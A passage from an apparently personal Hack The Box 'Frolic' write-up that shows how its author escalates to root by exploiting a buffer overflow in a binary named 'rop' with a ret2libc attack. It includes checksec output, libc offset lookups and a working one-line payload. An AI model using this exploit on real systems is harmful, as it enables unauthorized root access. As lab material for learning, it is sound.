<img src="{{ site.img_path }}/frolic_writeup/Frolic_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I check the security protections of the binary, and I see that it has only **NX** enabled, which allows me to perform a **ret2libc** attack. There is a resource on the internet that helped me a lot to understand the concept: [RET2LIBC ATTACK IN LINUX](https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3){:target="_blank"}.

> **LIBC:** The term **“libc”** is commonly used as a shorthand for the **“standard C library”**, a library of standard functions that can be used by all **C** programs (and sometimes by programs in other languages).

> **ret2libc:** We cannot point an arbitraty address into **Instruction Pointer** (**IP**) to run our shellcode from that address. This will fail, because there is no execution of shellcode when **NX** bit is enabled. The common way to bypass **NX** bit protection is to try **ret2libc** attack. In this attack, we would be loading the function arguments directly into stack so that it can be called by other function we need.

- We would be passing our arguments of the function into the stack by loading it into buffer space Pointing our **Instruction Pointer** (**IP**) to another function which uses our passed inputs as arguments Return function to execute when the program comes out of the pointed function.

```bash
gdb ./rop
  /> checksec
# --> NX enable!!     :)
```

I also attach the meaning of each security property of an executable, which I found in the article [Identify security properties on Linux using checksec](https://opensource.com/article/21/6/linux-checksec){:target="_blank"}:

- **Canary**: Canaries are known values that are placed between a buffer and control data on the stack to monitor buffer overflows.
- **PIE**: PIE stands for position-independent executable. As the name suggests, it's code that is placed somewhere in memory for execution regardless of its absolute address.
- **NX**: NX stands for "non-executable." It's often enabled at the CPU level, so an operating system with NX enabled can mark certain areas of memory as non-executable. Often, buffer-overflow exploits put code on the stack and then try to execute it. However, making this writable area non-executable can prevent such attacks.
- **RELRO**: RELRO stands for Relocation Read-Only. An Executable Linkable Format (ELF) binary uses a Global Offset Table (GOT) to resolve functions dynamically. When enabled, this security property makes the GOT within the binary read-only, which prevents some form of relocation attacks.
- **FORTIFY**: Perform checks on string and memory manipulation functions at compile time

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Well the following steps, with the help of `gdb` and other Linux binaries, are not complicated to perform to exploit the vulnerability. With `ldd` I find the **base libc address**, with `readelf` I find the offsets of the functions **“system()”** and **“exit()”** in the **libc** library, with `strings` I find the offset of **“/bin/sh”** and finally with `gdb` I calculate the real addresses of each of them.

> **Victime Machine:**

```bash
man ldd
# ldd - print shared object dependencies
ldd rop
# -> 0xb7e19000

man readelf
# readelf - display information about ELF files
readelf -s /lib/i386-linux-gnu/libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@| exit@@"
#    --> 0002e9d0        --> exit   -> libc + 0x0002e9d0
#    --> 0003ada0        --> system -> libc + 0x0003ada0

man strings
#     -a, --all
# - Scan the whole file, regardless of what sections it contains or whether those sections are loaded or initialized. Normally this is the default behaviour, but strings can be configured so that the -d is the default instead.

#     -t radix, --radix=radix
# - Print the offset within the file before each string.  The single character argument specifies the radix of the offset ---o for octal, x for hexadecimal, or d for decimal.

strings -a -t x /lib/i386-linux-gnu/libc.6 | grep "/bin/sh"
#    --> 15ba0b /bin/sh          Offset
```

> **Attacker Machine:**

```bash
gdb ./rop
  /> p 0xb7e19000 + 0x0003ada0
  /> p 0xb7e19000 + 0x0002e9d0
  /> p 0xb7e19000 + 0x15ba0b
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_82.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_83.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have all the information I need, I can overwrite the return address to make a **`jump`** to a function that I specify in my payload (**`system`**) and also pass the argument (**`/bin/sh`**). I run the command and pass the string with the exact amount to fill the buffer and then the addresses in **Little Endian** format and so I get a shell as the `root` user. I managed to escalate privileges and I can access the last flag.

```bash
./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
# :):)
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_84.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Box finished, but the concepts need to be strengthened with more practice, so I am looking for a new challenge in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform to perform another **Buffer Overflow** lab, it is a somewhat complex subject but I find it fascinating, and when they go up the level of difficulty is much more even more.  I do not forget to kill the box from the website.

<br /><br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_85.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
